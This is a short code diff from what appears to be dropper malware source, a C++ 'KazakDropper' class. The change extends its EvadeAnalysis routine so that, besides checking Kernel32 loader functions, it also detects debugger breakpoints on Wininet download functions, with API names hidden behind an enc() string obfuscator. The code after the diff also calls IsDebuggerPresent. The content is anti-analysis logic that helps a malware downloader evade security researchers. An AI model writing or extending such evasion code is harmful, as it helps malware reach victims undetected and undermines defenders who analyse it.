@@ -42,7 +42,7 @@ bool KazakDropper::EvadeAnalysis()
 {
 	int iNumberOfThreads = std::thread::hardware_concurrency();
 
-	if (KazakDropper::IsBp(enc("Kernel32.dll"), enc("GetModuleHandleA")) || KazakDropper::IsBp(enc("Kernel32.dll"), enc("LoadLibraryA")) || KazakDropper::IsBp(enc("Kernel32.dll"), enc("GetProcAddress")))
+	if (KazakDropper::IsBp(enc("Kernel32.dll"), enc("GetModuleHandleA")) || KazakDropper::IsBp(enc("Kernel32.dll"), enc("LoadLibraryA")) || KazakDropper::IsBp(enc("Kernel32.dll"), enc("GetProcAddress")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetOpenA")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetOpenUrl")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetReadFile")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetCloseHandle")))
 		return TRUE;
 
 	else if (IsDebuggerPresent())
